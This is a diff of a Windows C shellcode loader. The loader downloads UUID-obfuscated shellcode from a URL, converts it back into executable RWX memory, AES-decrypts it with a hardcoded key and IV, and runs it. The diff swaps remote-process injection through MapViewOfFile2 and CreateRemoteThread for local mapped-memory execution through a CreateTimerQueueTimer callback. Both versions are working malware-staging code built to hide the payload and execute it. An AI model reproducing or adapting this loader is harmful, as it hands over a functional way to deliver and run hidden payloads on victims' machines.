@@ -1,10 +1,8 @@
 #include <Windows.h>
 #include <stdio.h>
-#include <Tlhelp32.h>
 #include <wininet.h>
 #include <bcrypt.h>
 
-#pragma comment (lib, "OneCore.lib")	// needed to compile `MapViewOfFile2`
 #pragma comment(lib, "Bcrypt.lib")
 #pragma comment(lib, "wininet.lib")
 
@@ -17,12 +15,12 @@
 #define IVSIZE				16
 
 unsigned char pKey[] = {
-		0xD8, 0x13, 0x4D, 0xCE, 0xEA, 0x2B, 0x5B, 0xE7, 0x1C, 0x5C, 0xB2, 0x62, 0x66, 0x90, 0x25, 0x1D,
-		0x3E, 0x31, 0x06, 0x6D, 0xB0, 0xEB, 0xDF, 0x08, 0xB1, 0xB4, 0x62, 0x23, 0xB1, 0x0A, 0xA3, 0xD7 };
+        0xD8, 0x13, 0x4D, 0xCE, 0xEA, 0x2B, 0x5B, 0xE7, 0x1C, 0x5C, 0xB2, 0x62, 0x66, 0x90, 0x25, 0x1D,
+        0x3E, 0x31, 0x06, 0x6D, 0xB0, 0xEB, 0xDF, 0x08, 0xB1, 0xB4, 0x62, 0x23, 0xB1, 0x0A, 0xA3, 0xD7 };
 
 
 unsigned char pIv[] = {
-		0xB9, 0x4F, 0x7E, 0x0A, 0x48, 0x5A, 0x73, 0x27, 0x40, 0xC2, 0x8A, 0x3E, 0x29, 0xC3, 0x97, 0x25 };
+        0xB9, 0x4F, 0x7E, 0x0A, 0x48, 0x5A, 0x73, 0x27, 0x40, 0xC2, 0x8A, 0x3E, 0x29, 0xC3, 0x97, 0x25 };
 
 
 typedef struct _AES {
@@ -162,7 +160,7 @@ BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBY
 	memset(pCipherTextData, '\0', (SIZE_T)sCipherTextSize);
 	//copy aes decrypted payload
 	memcpy(pCipherTextData, *pPlainTextData, (SIZE_T)*sPlainTextSize);
-
+	
 	return TRUE;
 }
 
@@ -171,317 +169,219 @@ BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBY
 
 // https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
 typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
-	RPC_CSTR	StringUuid,
-	UUID* Uuid
-	);
+    RPC_CSTR	StringUuid,
+    UUID* Uuid
+    );
 
 BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
 
-	PBYTE		pBuffer = NULL,
-		TmpBuffer = NULL;
+    PBYTE		pBuffer = NULL,
+                TmpBuffer = NULL;
 
-	SIZE_T		sBuffSize = NULL;
+    SIZE_T		sBuffSize = NULL;
 
-	RPC_STATUS 	STATUS = NULL;
+    RPC_STATUS 	STATUS = NULL;
 
-	// Getting UuidFromStringA address from Rpcrt4.dll
-	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
-	if (pUuidFromStringA == NULL) {
-		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+    // Getting UuidFromStringA address from Rpcrt4.dll
+    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
+    if (pUuidFromStringA == NULL) {
+        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-	// Getting the real size of the shellcode which is the number of UUID strings * 16
-	sBuffSize = NmbrOfElements * 16;
+    // Getting the real size of the shellcode which is the number of UUID strings * 16
+    sBuffSize = NmbrOfElements * 16;
 
-	// Allocating memory which will hold the deobfuscated shellcode
-	//pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
-	pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	if (pBuffer == NULL) {
-		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
-		return FALSE;
-	}
+    // Allocating memory which will hold the deobfuscated shellcode
+    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
+    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (pBuffer == NULL) {
+        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+        return FALSE;
+    }
 
-	// Setting TmpBuffer to be equal to pBuffer
-	TmpBuffer = pBuffer;
+    // Setting TmpBuffer to be equal to pBuffer
+    TmpBuffer = pBuffer;
 
-	// Loop through all the UUID strings saved in UuidArray
-	for (int i = 0; i < NmbrOfElements; i++) {
+    // Loop through all the UUID strings saved in UuidArray
+    for (int i = 0; i < NmbrOfElements; i++) {
 
-		// Deobfuscating one UUID string at a time
-		// UuidArray[i] is a single UUID string from the array UuidArray
-		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
-			// if it failed
-			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
-			return FALSE;
-		}
+        // Deobfuscating one UUID string at a time
+        // UuidArray[i] is a single UUID string from the array UuidArray
+        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
+            // if it failed
+            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
+            return FALSE;
+        }
 
-		// 16 bytes are written to TmpBuffer at a time
-		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
-		TmpBuffer = (PBYTE)(TmpBuffer + 16);
+        // 16 bytes are written to TmpBuffer at a time
+        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
+        TmpBuffer = (PBYTE)(TmpBuffer + 16);
 
-	}
+    }
 
-	*ppDAddress = pBuffer;
-	*pDSize = sBuffSize;
+    *ppDAddress = pBuffer;
+    *pDSize = sBuffSize;
 
-	return TRUE;
+    return TRUE;
 }
 
 
 BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {
 
-	BOOL		bSTATE = TRUE;
+    BOOL		bSTATE = TRUE;
 
-	HINTERNET	hInternet = NULL,
-		hUrl = NULL;
+    HINTERNET	hInternet = NULL,
+                hUrl = NULL;
 
-	// Read and store the UUIDs from the URL without null terminators
-	char buffer[37]; // Assuming each UUID has 36 characters with a null terminator
-	DWORD bytesRead;
+    // Read and store the UUIDs from the URL without null terminators
+    char buffer[37]; // Assuming each UUID has 36 characters with a null terminator
+    DWORD bytesRead;
 
-	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
-	hInternet = InternetOpenW(L"EinAgent", NULL, NULL, NULL, NULL);
-	if (hInternet == NULL) {
-		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
+    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
+    hInternet = InternetOpenW(L"EinAgent", NULL, NULL, NULL, NULL);
+    if (hInternet == NULL) {
+        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+        bSTATE = FALSE; goto _EndOfFunction;
+    }
 
-	// Opening the handle to the payload using the payload's URL
-	hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-	if (hUrl == NULL) {
-		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
+    // Opening the handle to the payload using the payload's URL
+    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
+    if (hUrl == NULL) {
+        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+        bSTATE = FALSE; goto _EndOfFunction;
+    }
 
-	for (int i = 0; i < NumberOfElements; i++) {
-		if (!InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
-			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
-			InternetCloseHandle(hUrl);
-			InternetCloseHandle(hInternet);
-			return -1;
-		}
+    for (int i = 0; i < NumberOfElements; i++) {
+        if (!InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
+            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            return -1;
+        }
 
-		// Log the data for debugging
-		buffer[bytesRead] = '\0'; // Null-terminate the buffer
+        // Log the data for debugging
+        buffer[bytesRead] = '\0'; // Null-terminate the buffer
 
-		// Allocate memory for the UUID and copy the buffer
-		UUID[i] = (char*)malloc(bytesRead + 1);
-		if (UUID[i] == NULL) {
-			perror("Error allocating memory");
-			InternetCloseHandle(hUrl);
-			InternetCloseHandle(hInternet);
-			return -1;
-		}
-		memcpy(UUID[i], buffer, bytesRead + 1);
-	}
+        // Allocate memory for the UUID and copy the buffer
+        UUID[i] = (char*)malloc(bytesRead + 1);
+        if (UUID[i] == NULL) {
+            perror("Error allocating memory");
+            InternetCloseHandle(hUrl);
+            InternetCloseHandle(hInternet);
+            return -1;
+        }
+        memcpy(UUID[i], buffer, bytesRead + 1);
+    }
 
 
 _EndOfFunction:
-	if (hInternet)
-		InternetCloseHandle(hInternet);									// Closing handle 
-	if (hUrl)
-		InternetCloseHandle(hUrl);										// Closing handle
-	if (hInternet)
-		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
-	return bSTATE;
+    if (hInternet)
+        InternetCloseHandle(hInternet);									// Closing handle 
+    if (hUrl)
+        InternetCloseHandle(hUrl);										// Closing handle
+    if (hInternet)
+        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
+    return bSTATE;
 }
 
 
 
-// allocate a local `Mapped` writable buffer and copy the payload to it
-// then it maps that local buffer to an executable remote buffer, so that the remotly allcoated buffer
-// includes the payload  
-// it return the base address of the payload 
-BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* plAddress ,OUT PVOID* prAddress) {
+// allocate a local `Mapped` executable buffer and copy the payload to it
+// return the base address of the payload 
+BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
 
-	BOOL		bSTATE				= TRUE;
-	HANDLE		hFile				= NULL;
-	PVOID		pMapLocalAddress	= NULL,
-				pMapRemoteAddress	= NULL;
+	BOOL		bSTATE			= TRUE;
+	HANDLE		hFile			= NULL;
+	PVOID		pMapAddress		= NULL;
 
 
 	// create a file mapping handle with `RWX` memory permissions
-	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile/2 call  
-	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, 464, NULL);
+	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile call  
+	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, 464, NULL);
 	if (hFile == NULL) {
-		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
+		printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
 	// maps the view of the payload to the memory 
-	// FILE_MAP_WRITE are the permissions of the file (payload) - 
-	// since we only neet to write (copy) the payload to it
-	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, 464);
-	if (pMapLocalAddress == NULL) {
-		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
+	// FILE_MAP_WRITE | FILE_MAP_EXECUTE are the permissions of the file (payload) - 
+	// since we need to write (copy) then execute the payload
+	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, 464);
+	if (pMapAddress == NULL) {
+		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
+	
 
+	printf("[i] pMapAddress : 0x%p \n", pMapAddress);
 
-	printf("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);
-
-	printf("\t[#] Press <Enter> To Write The Payload ... ");
+	printf("[#] Press <Enter> To Copy The Payload ... ");
 	getchar();
-	printf("\t[i] Copying Payload To 0x%p ... ", pMapLocalAddress);
-	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
-	// Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
-	memset(pPayload, '\0', sPayloadSize);
+
+	printf("[i] Copying Payload To 0x%p ... ", pMapAddress);
+	memcpy(pMapAddress, pPayload, sPayloadSize);
+
+	  // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
+    memset(pPayload, '\0', sPayloadSize);
 	printf("[+] DONE \n");
-
-	// maps the payload to a new remote buffer (in the target process)
-	// it is possible here to change the memory permissions to `RWX`
-	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
-	if (pMapRemoteAddress == NULL) {
-		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
-	}
-
-	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);
-
+	
+	
 _EndOfFunction:
-	*plAddress = pMapLocalAddress;
-	*prAddress = pMapRemoteAddress;
+	*ppAddress = pMapAddress;
 	if (hFile)
 		CloseHandle(hFile);
 	return bSTATE;
 }
 
 
-BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
-
-	HANDLE			hSnapShot = NULL;
-	PROCESSENTRY32	Proc = {
-					.dwSize = sizeof(PROCESSENTRY32)
-	};
-
-	// Takes a snapshot of the currently running processes 
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-	if (hSnapShot == INVALID_HANDLE_VALUE) {
-		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
-		goto _EndOfFunction;
-	}
-
-	// Retrieves information about the first process encountered in the snapshot.
-	if (!Process32First(hSnapShot, &Proc)) {
-		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
-		goto _EndOfFunction;
-	}
-
-	do {
-
-		WCHAR LowerName[MAX_PATH * 2];
-
-		if (Proc.szExeFile) {
-
-			DWORD	dwSize = lstrlenW(Proc.szExeFile);
-			DWORD   i = 0;
-
-			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
-
-			// converting each charachter in Proc.szExeFile to a lower case character and saving it
-			// in LowerName to do the *wcscmp* call later ...
-
-			if (dwSize < MAX_PATH * 2) {
-
-				for (; i < dwSize; i++)
-					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
-
-				LowerName[i++] = '\0';
-			}
-		}
-
-		// compare the enumerated process path with what is passed, if equal ..
-		if (wcscmp(LowerName, szProcessName) == 0) {
-			// we save the process id 
-			*dwProcessId = Proc.th32ProcessID;
-			// we open a process handle and return
-			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
-			if (*hProcess == NULL)
-				printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
-
-			break;
-		}
-
-		// Retrieves information about the next process recorded the snapshot.
-	} while (Process32Next(hSnapShot, &Proc));
-	// while we can still have a valid output ftom Process32Net, continue looping
-
-
-_EndOfFunction:
-	if (hSnapShot != NULL)
-		CloseHandle(hSnapShot);
-	if (*dwProcessId == NULL || *hProcess == NULL)
-		return FALSE;
-	return TRUE;
-}
-
-
-int wmain(int argc, wchar_t* argv[]) {
-
-	if (argc < 2) {
-		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
-		return -1;
-	}
+int main() {
 
 	char* UuidArray[NumberOfElements];
 
 	PBYTE	Bytes = NULL;
-	SIZE_T	Size = NULL;
+    SIZE_T	Size = NULL;
 
-	if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
-		return -1;
-	}
+    if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
+        return -1;
+    }
 
 	// You can print them to verify
-	for (int i = 0; i < NumberOfElements; i++) {
-		printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
-	}
+    for (int i = 0; i < NumberOfElements; i++) {
+        printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
+    }
 
 	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
-		return -1;
-	}
+        return -1;
+    }
 
 	// defining two variables, that will be used in SimpleDecryption, (the output buffer and its size)
 	PVOID	pPlaintext = NULL;
 	DWORD	dwPlainSize = NULL;
 
-	HANDLE		hProcess		= NULL,
-				hThread			= NULL;
-	PVOID		pLAddress		= NULL,
-				pRAddress 		= NULL;
-	DWORD		dwProcessId		= NULL;
+	PVOID	pAddress	= NULL;
 
-
-	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
-	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
-		printf("[!] Process is Not Found \n");
+	if (!LocalMapInject(Bytes, Size, &pAddress)) {
 		return -1;
 	}
-	printf("[+] DONE \n");
-	printf("[+] Found Target Process Pid: %d \n", dwProcessId);
-
-	printf("[i] Injecting Target Process ... \n");
-	if (!RemoteMapInject(hProcess, Bytes, Size, &pLAddress, &pRAddress)) {
-		printf("[!] FAILED \n");
-		return -1;
-	}
-	printf("[+] DONE \n");
-
-	printf("[#] Press <Enter> To Decrypt The Payload ... ");
-	getchar();
 
 	// decryption
-	if (!SimpleDecryption(pLAddress, (DWORD)Size, pKey, pIv, &pPlaintext, &dwPlainSize)) {
+	if (!SimpleDecryption(pAddress, (DWORD)Size, pKey, pIv, &pPlaintext, &dwPlainSize)) {
 		return -1;
 	}
+
+
+	HANDLE	hTimer		= NULL;
 
 	printf("[#] Press <Enter> To Run The Payload ... ");
 	getchar();
 
-	hThread = CreateRemoteThread(hProcess, NULL, NULL, pRAddress, NULL, NULL, NULL);
-	if (hThread == NULL)
-		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
+	printf("[#] Press <Enter> To Run CreateTimerQueueTimer ... ");
+	getchar();
+	if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pAddress, NULL, NULL, NULL, NULL)){
+		printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
 
 	printf("[#] Press <Enter> To Quit ... ");
 	getchar();
@@ -490,16 +390,7 @@ int wmain(int argc, wchar_t* argv[]) {
 		VirtualFree(Bytes, 0, MEM_RELEASE);
 	if (pPlaintext)
 		HeapFree(GetProcessHeap(), 0, pPlaintext);
-	if (hThread)
-		CloseHandle(hThread);
-	if (pLAddress)
-		UnmapViewOfFile(pRAddress);
-	if (pRAddress)
-		UnmapViewOfFile2(hProcess, pRAddress, NULL);
-	if (hProcess)
-		CloseHandle(hProcess);
-
+	if (pAddress)
+		UnmapViewOfFile(pAddress);
 	return 0;
 }
-
-
